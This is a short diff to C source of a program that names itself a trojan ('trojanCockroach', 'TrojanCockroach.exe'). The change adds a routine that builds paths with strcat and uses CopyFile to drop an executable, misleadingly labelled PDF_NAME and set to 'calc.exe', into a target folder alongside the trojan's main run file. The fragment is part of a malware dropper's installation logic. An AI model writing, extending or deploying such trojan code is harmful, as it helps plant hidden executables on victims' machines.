@@ -1,4 +1,4 @@
-
+#define PDF_NAME "calc.exe"  //containing folder
 
 #define FOLDER_NAME "trojanCockroach"  //containing folder
 #define RUN_FILE_NAME "TrojanCockroach.exe"  //main run file
@@ -26,6 +26,19 @@ main(){
         return; // :)
 
         ///////////////////////////
+        char pdfex[100]={""};
+        strcat(pdfex, folderPath);
+        strcat(pdfex, "\\");
+        strcat(pdfex, PDF_NAME);
+
+        char pdfex_from[100]={""};
+        strcat(pdfex_from, FOLDER_NAME);
+        strcat(pdfex_from, "\\");
+        strcat(pdfex_from, PDF_NAME);
+
+        CopyFile(pdfex_from, pdfex, 0);
+
+        ///////////////////////////////
         char run[100]={""};
         strcat(run, folderPath);
         strcat(run, "\\");
